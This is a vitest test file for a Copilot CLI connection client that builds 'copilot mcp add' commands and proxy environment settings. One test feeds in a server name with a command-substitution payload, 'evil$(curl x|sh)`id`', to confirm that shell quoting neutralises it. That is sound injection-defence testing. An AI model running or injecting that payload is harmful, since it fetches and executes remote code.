import { describe, expect, it } from "vitest";
import {
  type ClientStep,
  CONNECT_CLIENTS,
  type McpBuildParams,
} from "./clients";

function getCopilotClient() {
  const client = CONNECT_CLIENTS.find((c) => c.id === "copilot-cli");
  if (!client) throw new Error("Copilot CLI client is missing");
  return client;
}

describe("Copilot CLI connection client", () => {
  it("registers the MCP gateway with OAuth or an Authorization bearer token", () => {
    const client = getCopilotClient();
    if (client.mcp.kind !== "custom") {
      throw new Error("Copilot CLI MCP support should be custom");
    }
    const mcp = client.mcp;

    const buildSteps = (params: McpBuildParams): ClientStep[] =>
      typeof mcp.steps === "function" ? mcp.steps(params) : mcp.steps;
    const oauthSteps = buildSteps({
      url: "http://localhost:9000/v1/mcp/default",
      token: null,
      serverName: "archestra",
    });
    const tokenSteps = buildSteps({
      url: "http://localhost:9000/v1/mcp/default",
      token: "archestra_TOKEN",
      serverName: "archestra",
    });

    expect(
      oauthSteps[0].buildCommand?.({
        url: "http://localhost:9000/v1/mcp/default",
        token: null,
        serverName: "archestra",
      }),
    ).toBe(
      "copilot mcp add --transport http 'archestra' 'http://localhost:9000/v1/mcp/default'",
    );
    expect(
      tokenSteps[0].buildCommand?.({
        url: "http://localhost:9000/v1/mcp/default",
        token: "archestra_TOKEN",
        serverName: "archestra",
      }),
    ).toBe(
      "copilot mcp add --transport http --header 'Authorization: Bearer archestra_TOKEN' 'archestra' 'http://localhost:9000/v1/mcp/default'",
    );
  });

  it("neutralizes shell metacharacters in a gateway-derived server name", () => {
    const client = getCopilotClient();
    if (client.mcp.kind !== "custom") {
      throw new Error("Copilot CLI MCP support should be custom");
    }
    const mcp = client.mcp;
    const steps =
      typeof mcp.steps === "function"
        ? mcp.steps({
            url: "http://localhost:9000/v1/mcp/default",
            token: null,
            serverName: "x",
          })
        : mcp.steps;

    // A member-editable gateway name carrying a command-substitution payload
    // must land inside a single-quoted arg, where `$()`/backticks are inert.
    const command = steps[0].buildCommand?.({
      url: "http://localhost:9000/v1/mcp/default",
      token: null,
      serverName: "evil$(curl x|sh)`id`",
    });
    expect(command).toBe(
      "copilot mcp add --transport http 'evil$(curl x|sh)`id`' 'http://localhost:9000/v1/mcp/default'",
    );

    // An embedded single quote is escaped rather than closing the quoting.
    const withQuote = steps[0].buildCommand?.({
      url: "http://localhost:9000/v1/mcp/default",
      token: null,
      serverName: "a'b",
    });
    expect(withQuote).toContain("'a'\\''b'");
  });

  it("renders LLM Proxy settings Copilot CLI can consume", () => {
    const client = getCopilotClient();
    if (client.proxy.kind !== "custom") {
      throw new Error("Copilot CLI proxy support should be custom");
    }

    const instruction = client.proxy.build({
      provider: "azure",
      providerLabel: "Azure OpenAI",
      url: "http://localhost:9000/v1/azure/default",
      tokenPlaceholder: "<your-azure-api-key>",
      proxyName: "default",
    });

    expect(instruction.kind).toBe("steps");
    if (instruction.kind !== "steps") return;
    expect(instruction.steps[0].body).toContain(
      "Use a virtual key mapped to Azure OpenAI",
    );
    expect(instruction.steps[0].body).toContain(
      'COPILOT_PROVIDER_TYPE stays "openai"',
    );
    const rendered = instruction.steps
      .map((step) => step.code ?? "")
      .join("\n");
    expect(rendered).toContain('COPILOT_PROVIDER_TYPE="openai"');
    expect(rendered).toContain(
      'COPILOT_PROVIDER_BASE_URL="http://localhost:9000/v1/azure/default"',
    );
    expect(rendered).toContain(
      'COPILOT_PROVIDER_API_KEY="<your-archestra-virtual-key>"',
    );
    expect(rendered).toContain("archestra-copilot-cli-ok");
  });

  it("uses the Copilot SVG path in the client picker", () => {
    const client = getCopilotClient();

    expect(client.svg).toContain("M19.245 5.364");
    expect(client.iconColor).toBe("#24292f");
    expect(client.iconOverride).toBeUndefined();
  });
});
